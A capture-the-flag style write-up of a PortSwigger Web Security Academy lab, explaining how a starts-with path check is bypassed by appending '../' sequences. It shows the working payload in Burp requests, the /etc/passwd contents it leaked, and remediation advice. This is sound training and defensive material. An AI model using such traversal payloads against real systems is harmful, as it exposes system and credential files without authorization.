# File Path Traversal — Validation of Start of Path

**PortSwigger Web Security Academy** | Topic: Path Traversal | Difficulty: Practitioner
**Status:** ✅ Solved

---

## Lab Description

This lab contains a path traversal vulnerability in the display of product images. Unlike the other labs in this series, the application **transmits the full file path via the request parameter** (not just a bare filename), and validates that the supplied path **starts with** the expected folder (e.g. `/var/www/images/`).

**Objective:** Retrieve the contents of `/etc/passwd`.

---

## Vulnerability Overview

Because the client sends the whole path rather than just a filename, the server can't rely on prepending a fixed base directory itself — so instead it does a **prefix check**: it confirms the supplied `filename` value *starts with* the expected directory, e.g. `/var/www/images/`, and if so, trusts the rest of the path.

The flaw is that a prefix check only constrains the **beginning** of the string — it says nothing about what comes after. Nothing stops the path from starting with the required prefix and then immediately traversing back out of it with `../` sequences:

```
/var/www/images/../../../etc/passwd
```

This value:
- **Starts with** `/var/www/images/` → passes the validation check.
- **Resolves to** `/etc/passwd` once the `../` segments are processed by the filesystem.

The check inspects the string as text; the filesystem interprets it as a path. That mismatch is the bypass.

---

## Methodology

### 1. Identify the vulnerable parameter
Burp's Proxy history shows the app sending the **full path** in the parameter, not just a filename:

```
GET /image?filename=/var/www/images/36.jpg
```

This is a strong signal the server-side check is a prefix/starts-with validation against a base directory, rather than the app constructing the base path itself.

### 2. Intercept and send to Repeater
The image request was intercepted in Burp Proxy and sent to **Repeater**.

### 3. Confirm baseline behaviour
Sending the original request unmodified:

```http
GET /image?filename=/var/www/images/36.jpg HTTP/2
Host: 0ae2006803eab221811f0c1b008500f4.web-security-academy.net
Cookie: session=hwtCYIverRP2dM3KiE0CUalx74bkCoPR
```

returns a normal `200 OK` with binary JPEG data, confirming the parameter is used as-is to read a file.

### 4. Bypass the prefix check
The `filename` parameter was set to a value that **keeps the required prefix intact** but appends traversal sequences after it to walk back out to the filesystem root:

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: 0ae2006803eab221811f0c1b008500f4.web-security-academy.net
Cookie: session=hwtCYIverRP2dM3KiE0CUalx74bkCoPR
```

### 5. Result

The server returned a `200 OK` with the contents of `/etc/passwd`:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
```

The lab was marked **Solved**.

---

## Root Cause

The application validates that the supplied path **starts with** an approved directory, but never re-validates the path **after** traversal sequences within it are resolved. A string can legitimately begin with `/var/www/images/` and still resolve to a completely different location once `../` segments are processed — the prefix check and the filesystem's own path resolution operate on the input differently, and the bypass lives in that gap.

---

## Evidence

| Step | Screenshot |
|---|---|
| Lab in "Not solved" state before the attack | `screenshots/01-lab-not-solved.png` |
| Burp Proxy intercept showing the full path sent in `filename` (e.g. `/var/www/images/36.jpg`) | `screenshots/02-burp-proxy-intercept.png` |
| Repeater baseline request — normal `filename=/var/www/images/36.jpg` returning a valid JPEG | `screenshots/03-baseline-request-normal-image.png` |
| Repeater request with `filename=/var/www/images/../../../etc/passwd` disclosing the file | `screenshots/04-repeater-prefix-bypass.png` |
| Lab in "Solved" state after the attack | `screenshots/05-lab-solved.png` |

---

## Remediation

- Never trust a client-supplied full path, even if it's checked against an expected prefix — a prefix (starts-with) check is not equivalent to path containment.
- Canonicalize the path first (resolve all `../` and symlinks, e.g. via `realpath`), **then** verify the canonical result falls within the intended base directory. Validate after resolution, not before.
- Prefer not accepting a full path from the client at all — map a simple identifier (e.g. a numeric image ID) to a server-side file path instead.
- Apply least-privilege filesystem permissions so sensitive files remain unreadable by the application's service account even if a traversal bypass occurs.

---

## References

- [PortSwigger Web Security Academy – Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
